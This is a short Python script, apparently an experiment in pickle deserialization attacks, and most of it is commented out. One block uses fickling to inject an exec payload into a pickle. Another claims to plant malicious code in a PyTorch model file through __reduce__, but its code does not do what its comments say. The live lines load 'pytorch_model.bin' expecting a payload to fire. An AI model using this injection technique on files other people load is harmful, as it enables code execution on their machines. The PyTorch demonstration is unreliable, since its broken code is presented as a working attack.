# from fickling.pickle import Pickled
# import pickle
#
# # Create a malicious pickle
# data = "my friend needs to know this"
#
# pickle_bin = pickle.dumps(data)
#
# p = Pickled.load(pickle_bin)
#
# p.insert_python_exec('print("you\'ve been pwned !")')
#
# with open('payload.pkl', 'wb') as f:
#     p.dump(f)
#
# # innocently unpickle and get your friend's data
# with open('payload.pkl', 'rb') as f:
#     data = pickle.load(f)
#     print(data)
# import torch
# import pickle
# import os
#
# # Step 1: 定义一个恶意类，用来注入恶意代码
# class MaliciousModel(torch.nn.Module):
#     def __init__(self):
#         super(MaliciousModel, self).__init__()
#         # 模型的正常定义
#         self.dummy_param = torch.nn.Parameter(torch.zeros(1))
#
#     def forward(self, x):
#         return x
#
#     def __reduce__(self):
#         # 使用 __reduce__ 来注入恶意代码
#         # 在反序列化时执行一个命令
#         return (self.__class__, ())  # 这会返回恶意类并调用构造方法
#
#     def malicious_code(self):
#         # 在模型加载时执行恶意命令
#         os.system('echo "Malicious code executed!"')
#
# # Step 2: 创建恶意模型实例
# malicious_model = MaliciousModel()
#
# # 将模型保存为一个 PyTorch 的二进制文件 (.bin)
# malicious_model_path = "malicious_model.bin"
# torch.save(malicious_model.state_dict(), malicious_model_path)
#
# # 使用 pickle 模块将恶意代码序列化到文件
# with open(malicious_model_path, 'rb') as f:
#     malicious_bin = torch.load(f)  # 在这里注入恶意代码
#
#
#
# print("Malicious model with injected payload created.")
#
# # Step 3: 加载恶意的 pickle 文件，这时恶意代码会被执行
# with open('malicious_payload.pkl', 'rb') as f:
#     malicious_model = pickle.load(f)  # 恶意代码会在这里执行
#
# # 使用恶意模型
# try:
#     print(malicious_model.dummy_param)
# except Exception as e:
#     print(f"Error while using model: {e}")
import torch
import os



# Step 3: 恶意加载模型，触发恶意代码
loaded_model = torch.load('pytorch_model.bin')
print(loaded_model)

